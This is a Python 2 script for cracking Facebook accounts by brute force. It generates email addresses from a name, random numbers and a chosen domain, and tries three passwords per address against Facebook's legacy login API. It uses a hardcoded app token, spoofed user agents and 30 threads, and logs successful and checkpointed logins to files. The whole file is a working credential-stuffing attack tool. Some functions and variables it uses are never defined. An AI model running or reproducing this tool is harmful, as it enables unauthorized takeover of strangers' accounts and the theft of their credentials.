import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(9990):
    nmbr = random.randint(111, 999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 nmbr.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 7.0; BAH-W09 Build/HUAWEIBAH-W09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Safari/537.36 [FB_IAB/FB4A;FBAV/154.0.0.29.385;]')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; KTXN B661094629A90240T1390849P1) like Gecko')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 8.0.0; STF-L09 Build/HUAWEISTF-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/169.0.0.46.94;]')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; KTXN B667897245A77460T1297416P1) like Gecko')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 6.0.1; SM-J106H Build/MMB29Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36 SamsungBrowser/CrossApp/0.1.90')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; KTXN B673272004A48129T1390849P1) like Gecko')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36 Mailbird/2.5.8.0/ Mailbird/2.5.8.0/')]
br.addheaders = [('user-agent', 'Millennium/20180228 CFNetwork/811.4.18 Darwin/16.5.0')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 7.0; VFD 610 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/162.0.0.45.94;]')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 5.0.2; VF-1497 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36')]
br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 7.0; BAH-W09 Build/HUAWEIBAH-W09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Safari/537.36 [FB_IAB/FB4A;FBAV/154.0.0.29.385;]')]

def menu():
    os.system('clear')
    print logo
    psb ('Menu Crack Email : \n')
    print '  \033[1;97m[\033[1;92m01\033[1;97m]  Start Crack Email'
    time.sleep(0.05)
    print '  \033[1;97m[\033[1;92m00\033[1;97m]  Back To Menu            '
    print 45 * '-'
    action()

def action():
    global cpb
    global oks
    anggaxd = raw_input('\n\033[1;97m[\033[1;93m?\033[1;97m] Choose an Option : \033[1;92m')
    if anggaxd == '':
        print '[!] Fill in correctly'
        action()
    elif anggaxd == '1' or anggaxd == '01':
    	os.system('clear') 
        print logo
        print ('[\033[1;93m•\033[1;97m] Nama   \033[1;91m: \033[1;97mputri.ayu') 
        print ('[\033[1;92m+\033[1;97m] Domain \033[1;91m: \033[1;97m@gmail.com @yahoo.com @hotmail.com') 
        try:
            c = raw_input('[\033[1;92m+\033[1;97m] Nama   \033[1;91m: \033[1;97m')
            k = raw_input('[\033[1;93m?\033[1;97m] Domain \033[1;91m: \033[1;97m')
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif anggaxd == '0' or anggaxd == '00':
        menu()
    else:
        print '[!] Fill in correctly'
        action()  
    anggaxd1 = raw_input('[\033[1;92m+\033[1;97m] Password 1 \033[1;91m: \033[1;97m')
    anggaxd2 = raw_input('[\033[1;92m+\033[1;97m] Password 2 \033[1;91m: \033[1;97m')
    anggaxd3 = raw_input('[\033[1;92m+\033[1;97m] Password 3 \033[1;91m: \033[1;97m')
    print "\033[1;97m--------------------------------------------------"
    xxx = str(len(id))
    psb ('[\033[1;93m+\033[1;97m] Total Numbers: '+xxx)
    time.sleep(0.5)
    psb ('[\033[1;92m✓\033[1;97m] Cracking Process Has Been Started ...') 
    time.sleep(0.5)
    psb ('[\033[1;91m!\033[1;97m] To Stop Process Press CTRL Then Press z')
    time.sleep(0.5)
    print "\033[1;97m--------------------------------------------------"
    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = anggaxd1
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + user + c + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK\xe2\x88\x9a]  ' + k + user + c + ' ◐ ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + user + c + ' ◐ ' + pass1 + '\n')
                okb.close()
                oks.append(k + user + c + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;92m[OK\xe2\x88\x9a] ' + k + user + c + ' ◐ ' + pass1 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + user + c + ' ◐ ' + pass1 + '\n')
                cps.close()
                cpb.append(k + user + c + pass1)
            else:
                pass2 = anggaxd2
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + user + c + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[OK\xe2\x88\x9a]  ' + k + user + c + ' ◐ ' + pass2 + '\n' + '\n'
                    okb = open('save/successfull.txt', 'a')
                    okb.write(k + user + c + ' ◐ ' + pass2 + '\n')
                    okb.close()
                    oks.append(k + user + c + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;92m[OK\xe2\x88\x9a] ' + k + user + c + ' ◐ ' + pass2 + '\n'
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k + user + c + ' ◐ ' + pass2 + '\n')
                    cps.close()
                    cpb.append(k + user + c + pass2)
                else:
                    pass3 = anggaxd3
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + user + c + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[OK\xe2\x88\x9a]  ' + k + user + c + ' ◐ ' + pass3 + '\n' + '\n'
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k + user + c + ' ◐ ' + pass3 + '\n')
                        okb.close()
                        oks.append(k + user + c + pass3)
                        
        except:
            pass
            
    p = ThreadPool(30)
    p.map(main, id)
    print "\033[1;97m--------------------------------------------------"
    print '\033[1;97m[\033[1;92m✓\033[1;97m] Process Has Been Completed ...'
    print '[\033[1;92m✓\033[1;97m] Total \033[1;92mSuccessfully\033[1;97m/\033[1;93mCheckpoint\033[1;97m : '+str(len(oks))+'/'+str(len(cpb))
    print('[\033[1;92m✓\033[1;97m] Cracking Email Has Been Saved : anggaxd/crack.txt')
    
    raw_input("\n\033[1;97m[\033[1;97mPress Enter Go Back\033[1;97m]")
    menu() 
